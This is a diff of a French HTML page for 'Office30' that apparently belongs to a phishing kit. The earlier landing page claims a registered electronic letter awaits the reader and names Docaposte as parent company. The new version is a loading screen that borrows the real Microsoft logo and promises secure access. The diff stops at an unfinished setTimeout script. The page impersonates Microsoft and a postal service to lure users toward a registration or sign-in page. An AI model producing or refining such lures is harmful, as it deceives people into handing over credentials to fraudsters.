@@ -1,50 +1,123 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="fr">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Accueil - Office30</title>
-    <link rel="stylesheet" href="office30-theme.css" />
+    <title>Chargement - Office30</title>
+    <style>
+      html,
+      body {
+        width: 100%;
+        height: 100%;
+        margin: 0;
+      }
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: Segoe UI, sans-serif;
+        background: #f5f7fb;
+      }
+
+      .loading-box {
+        width: min(92vw, 440px);
+        min-height: 320px;
+        border-radius: 16px;
+        background: #fff;
+        border: 1px solid #e0e0e0;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.14);
+        padding: 24px 28px;
+        box-sizing: border-box;
+      }
+
+      .logo-wrap {
+        margin-bottom: 18px;
+      }
+
+      .dot-track {
+        position: relative;
+        height: 18px;
+        margin-bottom: 18px;
+        overflow: hidden;
+      }
+
+      .dot {
+        position: absolute;
+        top: 0;
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: #0067b8;
+        animation: slideDot 1.8s linear infinite;
+      }
+
+      .dot:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .dot:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .dot:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+      .dot:nth-child(4) {
+        animation-delay: 0.6s;
+      }
+
+      @keyframes slideDot {
+        0% {
+          left: 108%;
+          opacity: 0;
+        }
+        25% {
+          opacity: 1;
+        }
+        50% {
+          left: 50%;
+          transform: translateX(-50%);
+          opacity: 1;
+        }
+        100% {
+          left: -12%;
+          opacity: 0;
+        }
+      }
+
+      .title {
+        font-size: 30px;
+        line-height: 1.2;
+        font-weight: 600;
+        color: #1b1b1b;
+        margin: 0 0 8px;
+      }
+
+      .text {
+        margin: 0;
+        font-size: 14px;
+        line-height: 20px;
+        color: #555;
+      }
+    </style>
   </head>
   <body>
-    <header>
-      <div class="ContextMenuControl-module__context-menu__qivRQ">
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">Office30 - Lettre Recommandée Électronique</span>
-        </div>
+    <section class="loading-box" aria-live="polite">
+      <div class="logo-wrap">
+        <img
+          src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/microsoftLogoLightMode.svg"
+          alt="Microsoft"
+          style="height: 24px; width: 112.55px"
+        />
       </div>
-    </header>
-
-    <main>
-      <section class="ContextMenuControl-module__context-menu__qivRQ">
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <div class="ActivityControl-module__activity-item__j7T17">
-            <span class="ActivityControl-module__activity-type-icon__DHyyA">•</span>
-            <div class="ActivityControl-module__activity-content__ealEs">
-              <p class="ActivityControl-module__activity-text__qEjee">Bienvenue sur Office30</p>
-              <p class="ActivityControl-module__activity-timestamp__YmN5s">Votre recommandé est prêt à être consulté.</p>
-            </div>
-          </div>
-        </div>
-
-        <div class="SearchSuggestionButton-module__search-button-container__HFMq7">
-          <a class="SearchSuggestionButton-module__search-button-container__link__nVQ2Q" href="register.html">
-            <span class="SearchSuggestionButton-module__search-icon__container__xOAsW">
-              <span class="SearchSuggestionButton-module__search-icon__fFnFE">→</span>
-            </span>
-            <span class="SearchSuggestionButton-module__search-button-container__text__iGWxm">Continuer</span>
-          </a>
-        </div>
-      </section>
-    </main>
-
-    <footer>
-      <div class="ContextMenuControl-module__context-menu__qivRQ">
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">Office30 est une filiale de Docaposte</span>
-        </div>
+      <div class="dot-track" aria-hidden="true">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
       </div>
-    </footer>
+      <h1 class="title">Chargement</h1>
+      <p class="text">Préparation de votre accès sécurisé Office30.</p>
+    </section>
 
     <script>
       setTimeout(() => {
